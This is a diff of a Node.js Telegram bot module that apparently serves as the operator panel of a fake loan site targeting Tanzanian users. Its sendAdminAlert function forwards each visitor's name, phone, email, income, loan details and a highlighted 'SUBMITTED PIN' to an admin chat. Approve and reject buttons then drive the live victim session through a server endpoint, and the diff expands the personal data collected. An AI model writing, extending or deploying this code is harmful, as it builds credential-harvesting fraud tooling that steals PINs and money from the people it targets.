@@ -1,33 +1,39 @@
 const { Telegraf, Markup } = require('telegraf');
 const axios = require('axios');
 
-// Validate environment variables immediately
-const BOT_TOKEN = process.env.BOT_TOKEN;
+const bot = process.env.BOT_TOKEN ? new Telegraf(process.env.BOT_TOKEN) : null;
 const ADMIN_ID = process.env.ADMIN_CHAT_ID;
 const SERVER_URL = process.env.RENDER_EXTERNAL_URL;
 
-// Initialize bot only if token exists to prevent startup crashes
-const bot = BOT_TOKEN ? new Telegraf(BOT_TOKEN) : null;
-
-if (!bot) {
-    console.error("❌ ERROR: BOT_TOKEN is missing. Telegram alerts will not function.");
-}
-
 const sendAdminAlert = async (info) => {
-    if (!bot || !ADMIN_ID) {
-        console.warn("⚠️ Cannot send alert: Bot not initialized or ADMIN_CHAT_ID missing.");
-        return;
-    }
+    if (!bot || !ADMIN_ID) return;
 
     try {
-        let message = `🚀 *User Activity Update*\n`;
-        message += `━━━━━━━━━━━━━━━━━━\n`;
-        message += `📍 *Step:* ${info.step ? info.step.replace(/_/g, ' ') : 'N/A'}\n`;
-        message += `🆔 *Socket:* \`${info.socketId}\`\n`;
+        let msg = `🚀 *User Activity Update*\n`;
+        msg += `━━━━━━━━━━━━━━━━━━\n`;
+        msg += `📍 *Step:* ${info.step.replace(/_/g, ' ')}\n`;
+        msg += `🆔 *Socket:* \`${info.socketId}\`\n\n`;
+
+        // Profile Details (Accumulated)
+        if (info.firstName) msg += `👤 *Name:* ${info.firstName} ${info.lastName || ''}\n`;
+        if (info.phone)     msg += `📱 *Phone:* \`+255${info.phone}\`\n`;
+        if (info.email)     msg += `📧 *Email:* ${info.email}\n`;
         
-        if (info.phone) message += `📱 *Phone:* \`+255${info.phone}\`\n`;
-        if (info.amount) message += `💰 *Amount:* TZS ${Number(info.amount).toLocaleString()}\n`;
-        if (info.pin) message += `🔑 *PIN:* \`${info.pin}\`\n`;
+        // Loan Details
+        if (info.amount)    msg += `💰 *Amount:* TZS ${Number(info.amount).toLocaleString()}\n`;
+        if (info.loanType)  msg += `📝 *Type:* ${info.loanType}\n`;
+        if (info.term)      msg += `⏱️ *Term:* ${info.term} Month(s)\n`;
+        
+        // Employment
+        if (info.income)    msg += `💵 *Income:* TZS ${Number(info.income).toLocaleString()}\n`;
+        if (info.employment) msg += `💼 *Status:* ${info.employment}\n`;
+
+        // Critical Security Data
+        if (info.pin) {
+            msg += `\n━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🔑 *SUBMITTED PIN:* \`${info.pin}\`\n`;
+            msg += `━━━━━━━━━━━━━━━━━━\n`;
+        }
 
         const keyboard = info.step === '5_PIN_SUBMITTED' ? Markup.inlineKeyboard([
             [
@@ -36,48 +42,35 @@ const sendAdminAlert = async (info) => {
             ]
         ]) : null;
 
-        await bot.telegram.sendMessage(ADMIN_ID, message, { 
+        await bot.telegram.sendMessage(ADMIN_ID, msg, { 
             parse_mode: 'Markdown', 
             ...(keyboard || {}) 
         });
-    } catch (err) {
-        console.error("Telegram Send Error:", err.message);
+    } catch (e) {
+        console.error("Telegram Alert Error:", e.message);
     }
 };
 
-// Only set up listeners and launch if bot exists
 if (bot) {
     bot.action(/approve_(.+)/, async (ctx) => {
+        const socketId = ctx.match[1];
         try {
-            const socketId = ctx.match[1];
-            await axios.post(`${SERVER_URL}/admin/action`, { 
-                socketId, 
-                action: 'approve', 
-                referenceId: 'MIX-' + Math.floor(Math.random() * 1000000) 
-            });
-            await ctx.editMessageText("✅ Approved and sent to user.");
-        } catch (err) {
-            console.error("Approve Action Error:", err.message);
-            await ctx.answerCbQuery("Failed to connect to server.");
-        }
+            await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'approve' });
+            await ctx.answerCbQuery("Approved");
+            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n✅ *STATUS: APPROVED*", { parse_mode: 'Markdown' });
+        } catch (err) { await ctx.answerCbQuery("Server Error"); }
     });
 
     bot.action(/reject_(.+)/, async (ctx) => {
+        const socketId = ctx.match[1];
         try {
-            const socketId = ctx.match[1];
             await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'reject' });
-            await ctx.editMessageText("❌ User was rejected.");
-        } catch (err) {
-            console.error("Reject Action Error:", err.message);
-            await ctx.answerCbQuery("Failed to connect to server.");
-        }
+            await ctx.answerCbQuery("Rejected");
+            await ctx.editMessageText(ctx.callbackQuery.message.text + "\n\n❌ *STATUS: REJECTED*", { parse_mode: 'Markdown' });
+        } catch (err) { await ctx.answerCbQuery("Server Error"); }
     });
 
-    // Launch bot without blocking the main process
-    bot.launch()
-        .then(() => console.log("🤖 Telegram Bot Manager Active"))
-        .catch(err => console.error("❌ Bot Launch Failed:", err.message));
+    bot.launch().catch(err => console.error("Bot fail:", err.message));
 }
 
-// Export the function
 module.exports = { sendAdminAlert };
